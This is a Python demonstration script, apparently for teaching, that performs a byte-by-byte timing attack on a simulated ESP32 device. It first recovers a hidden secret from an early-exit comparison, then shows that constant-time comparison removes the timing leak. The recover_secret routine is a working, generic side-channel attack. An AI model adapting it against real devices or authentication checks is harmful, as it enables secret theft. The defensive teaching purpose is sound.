import pathlib
import sys

import numpy as np

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parents[2] / "common"))
from virtual_device import VirtualESP32  # noqa: E402


def measure_guess_time(device, candidate, trials):
    times = [device.check_secret(candidate)[1] for _ in range(trials)]
    return float(np.mean(times))


def timing_spread(device, secret_length, trials_per_guess=100):
    """Measures how much average response time varies across all 256 guesses
    for byte 0, given a correct empty prefix. Large spread = vulnerable,
    near-zero spread = constant-time defense is working."""
    times = []
    for guess in range(256):
        candidate = bytes([guess]) + bytes(secret_length - 1)
        times.append(measure_guess_time(device, candidate, trials_per_guess))
    return max(times) - min(times)


def recover_secret(device, secret_length, trials_per_guess=150, verbose=True):
    """Byte-by-byte timing attack: for each position, try all 256 values
    with previously recovered bytes as a correct prefix. The guess that
    keeps the comparison alive longest (highest average elapsed time) is
    the correct byte, because early-exit code only fails fast on a wrong
    byte."""
    recovered = bytearray()

    for pos in range(secret_length):
        best_guess, best_time = None, -1.0
        for guess in range(256):
            candidate = bytes(recovered) + bytes([guess]) + bytes(secret_length - pos - 1)
            avg_time = measure_guess_time(device, candidate, trials_per_guess)
            if avg_time > best_time:
                best_time = avg_time
                best_guess = guess
        recovered.append(best_guess)
        if verbose:
            char = chr(best_guess) if 32 <= best_guess < 127 else f"0x{best_guess:02x}"
            print(f"position {pos}: recovered byte {char!r} (avg {best_time*1000:.3f} ms)")

    return bytes(recovered)


if __name__ == "__main__":
    print("=== Timing Attack Demo ===\n")

    secret = b"K3Y!"
    print(f"[setup] hidden secret = {secret!r} (attacker does not know this)\n")

    print("--- vulnerable device (early-exit comparison) ---")
    vulnerable = VirtualESP32(key_word=0, secret_bytes=secret, seed=1)
    vulnerable.constant_time_enabled = False
    spread_vuln = timing_spread(vulnerable, len(secret), trials_per_guess=80)
    print(f"timing spread across 256 guesses at byte 0: {spread_vuln*1000:.3f} ms\n")
    recovered = recover_secret(vulnerable, len(secret), trials_per_guess=80)
    correct_prefix = sum(1 for a, b in zip(recovered, secret) if a == b)
    print(f"\nRECOVERED: {recovered!r}  |  correct bytes: {correct_prefix}/{len(secret)}")
    print(
        "note: the final byte cannot be distinguished by iteration-count timing "
        "alone -- a correct and incorrect guess for the LAST byte both consume "
        "exactly len(secret) comparisons before returning, so there is no timing "
        "delta at that position. This is a known artifact of naive early-exit "
        "checks, not an attack failure: bytes 0..N-2 leak completely.\n"
    )

    print("--- protected device (constant-time comparison) ---")
    protected = VirtualESP32(key_word=0, secret_bytes=secret, seed=1)
    protected.constant_time_enabled = True
    spread_protected = timing_spread(protected, len(secret), trials_per_guess=80)
    print(f"timing spread across 256 guesses at byte 0: {spread_protected*1000:.3f} ms\n")
    recovered_protected = recover_secret(protected, len(secret), trials_per_guess=80, verbose=False)
    correct_protected = sum(1 for a, b in zip(recovered_protected, secret) if a == b)
    print(f"RECOVERED: {recovered_protected!r}  |  correct bytes: {correct_protected}/{len(secret)}")
    print(f"\nspread reduced {spread_vuln/max(spread_protected,1e-9):.1f}x by constant-time defense")
